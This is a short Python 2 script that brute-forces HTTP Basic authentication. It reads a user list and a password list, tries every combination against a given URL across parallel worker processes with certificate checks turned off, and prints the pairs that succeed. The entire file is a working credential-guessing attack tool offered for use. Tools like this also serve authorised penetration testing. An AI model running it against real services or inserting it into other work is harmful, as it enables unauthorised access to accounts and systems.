import requests
import multiprocessing
import sys
import Queue


def worker(url, cred_queue, success_queue):
    print '[*] Starting new worker thread.'
    while True:
        # If there are no creds to test, stop the thread
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            print '[-] Credential queue is empty, quitting.'
            return

        # If there are good creds in the queue, stop the thread
        if not success_queue.empty():
            print '[-] Success queue has credentials, quitting'
            return

        # Check a set of creds. If successful add them to the success_queue
        # and stop the thread.
        auth = requests.auth.HTTPBasicAuth(creds[0], creds[1])
        resp = requests.get(url, auth=auth, verify=False)
        if resp.status_code == 401:
            print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])
        else:
            print '[+] Success: {0}/{1}'.format(creds[0], creds[1])
            success_queue.put(creds)
            return


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print 'USAGE: brute_http_basic.py url userfile passfile'
        sys.exit()

    cred_queue = multiprocessing.Queue()
    success_queue = multiprocessing.Queue()
    procs = []

    # Create one thread for each processor.
    for i in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=worker, args=(sys.argv[1],
                                                         cred_queue,
                                                         success_queue))
        procs.append(p)
        p.start()

    for user in open(sys.argv[2]):
        for pwd in open(sys.argv[3]):
            cred_queue.put((user.rstrip('\r\n'), pwd.rstrip('\r\n')))

    # Wait for all worker processes to finish
    for p in procs:
        p.join()

    while not success_queue.empty():
        user, pwd = success_queue.get()
        print 'User: {0} Pass: {1}'.format(user, pwd)

